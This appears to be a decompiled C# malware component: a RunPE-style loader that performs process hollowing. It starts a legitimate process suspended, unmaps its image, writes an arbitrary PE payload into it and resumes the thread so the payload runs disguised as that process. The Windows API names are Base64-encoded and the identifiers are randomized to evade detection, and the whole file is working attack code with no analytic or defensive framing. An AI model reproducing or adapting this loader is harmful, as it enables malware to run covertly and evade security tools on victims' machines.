using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class6
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate0(string ietrditgqlkybeccz, StringBuilder gisswaffbyrczcjbek, IntPtr tddvzyuanpptiley, IntPtr ycqlhnopsrfcrqntkq, [MarshalAs(UnmanagedType.Bool)] bool eaujxngrghxreezr, int jagdrflhlgcppngkw, IntPtr qftzyqcyyhqalvcldis, string bvdqwpklthusqazhws, byte[] fjplrhicndhdizglrwr, IntPtr[] poegrpgaokukwhbc);

	public delegate bool Delegate1(IntPtr hiknaiiqyqcrskcd, IntPtr dvjxepuaeohgthdhpei, byte[] rayhtovktvtpnqsprofv, uint gobjshapdwhffjwrqj, int sfztruhrredwfadfexn);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate2(IntPtr hpjvxhftkugsddeoaxrv, IntPtr iesuuhchynegvvzlqz, ref IntPtr aanqiibdlcdgsyaiuthg, int kgvischhvgphidni, ref IntPtr tnieryiajydgnfah);

	public delegate IntPtr Delegate3(IntPtr ptxvzenhfiyxjrukuiaa, IntPtr gwsrduhhhelsotxpp, IntPtr wscnyxncgrtvlwsjy, int oykcpqvtqoonaicn, int bsgijtjjdskoknjpk);

	public delegate uint Delegate4(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

	public delegate uint Delegate5(IntPtr lcelxaicxuenriantqju);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate6(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate7(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_0), ref string_1), typeof(T));
	}

	public static bool smethod_1(byte[] byte_0, string string_0)
	{
		Delegate0 @delegate = smethod_0<Delegate0>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
		Delegate6 delegate2 = smethod_0<Delegate6>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")));
		Delegate2 delegate3 = smethod_0<Delegate2>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
		Delegate3 delegate4 = smethod_0<Delegate3>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
		Delegate1 delegate5 = smethod_0<Delegate1>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")));
		Delegate7 delegate6 = smethod_0<Delegate7>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
		Delegate5 delegate7 = smethod_0<Delegate5>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")));
		Delegate4 delegate8 = smethod_0<Delegate4>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] fjplrhicndhdizglrwr = new byte[68];
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt16(byte_0, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_0, num + 84));
				if (@delegate(null, new StringBuilder(string_0), zero, zero, eaujxngrghxreezr: false, 4, zero, null, fjplrhicndhdizglrwr, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (delegate2(array[1], array2))
					{
						IntPtr iesuuhchynegvvzlqz = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr aanqiibdlcdgsyaiuthg = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr tnieryiajydgnfah = IntPtr.Zero;
						if (delegate3(array[0], iesuuhchynegvvzlqz, ref aanqiibdlcdgsyaiuthg, (int)intPtr2, ref tnieryiajydgnfah) && unchecked((long)delegate8(array[0], aanqiibdlcdgsyaiuthg)) == 0L)
						{
							IntPtr dvjxepuaeohgthdhpei = delegate4(gwsrduhhhelsotxpp: new IntPtr(BitConverter.ToInt32(byte_0, num + 52)), wscnyxncgrtvlwsjy: new IntPtr(BitConverter.ToInt32(byte_0, num + 80)), ptxvzenhfiyxjrukuiaa: array[0], oykcpqvtqoonaicn: 12288, bsgijtjjdskoknjpk: 64);
							int num3 = dvjxepuaeohgthdhpei.ToInt32();
							int sfztruhrredwfadfexn = default(int);
							delegate5(array[0], dvjxepuaeohgthdhpei, byte_0, (uint)(int)intPtr, sfztruhrredwfadfexn);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(byte_0, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(byte_0, array3[5], array4, 0, array4.Length);
								delegate5(dvjxepuaeohgthdhpei: new IntPtr(num3 + array3[3]), gobjshapdwhffjwrqj: (uint)(int)new IntPtr(array4.Length), hiknaiiqyqcrskcd: array[0], rayhtovktvtpnqsprofv: array4, sfztruhrredwfadfexn: sfztruhrredwfadfexn);
							}
							delegate5(dvjxepuaeohgthdhpei: new IntPtr(unchecked((long)array2[41]) + 8L), gobjshapdwhffjwrqj: (uint)(int)new IntPtr(4), hiknaiiqyqcrskcd: array[0], rayhtovktvtpnqsprofv: BitConverter.GetBytes(dvjxepuaeohgthdhpei.ToInt32()), sfztruhrredwfadfexn: sfztruhrredwfadfexn);
							array2[44] = (uint)(dvjxepuaeohgthdhpei.ToInt32() + BitConverter.ToInt32(byte_0, num + 40));
							delegate6(array[1], array2);
						}
					}
					delegate7(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
